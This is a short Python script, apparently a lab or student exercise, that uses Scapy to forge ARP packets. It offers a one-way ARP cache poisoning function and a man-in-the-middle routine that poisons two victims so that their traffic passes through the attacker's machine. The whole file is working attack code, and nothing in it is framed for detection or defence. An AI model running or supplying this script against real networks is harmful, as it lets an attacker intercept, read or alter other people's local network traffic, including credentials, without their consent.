from scapy.all import *

def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof):
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim

    sendp(arp, iface = "enp0s3")
    
def oneWayPoisoning():
    
    macAttacker = input("Attacker MAC address:")
    ipAttacker = input("Attacker IP address:")

    macVictim = input("Victim MAC address:")
    ipVictim = input("Victim IP address:")

    ipToSpoof = input("IP address to impersonate:")
    
    arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof)
    
def mimAttack():
    macAttacker = input("Attacker MAC address:")
    ipAttacker = input("Attacker IP address:")

    macVictim1 = input("Victim 1 MAC address:")
    ipVictim1 = input("Victim 1 IP address:")
    
    macVictim2 = input("Victim 2 MAC address:")
    ipVictim2 = input("Victim 2 IP address:")
    
    arpPoison(macAttacker, macVictim1, ipVictim1, ipVictim2)
    arpPoison(macAttacker, macVictim2, ipVictim2, ipVictim1)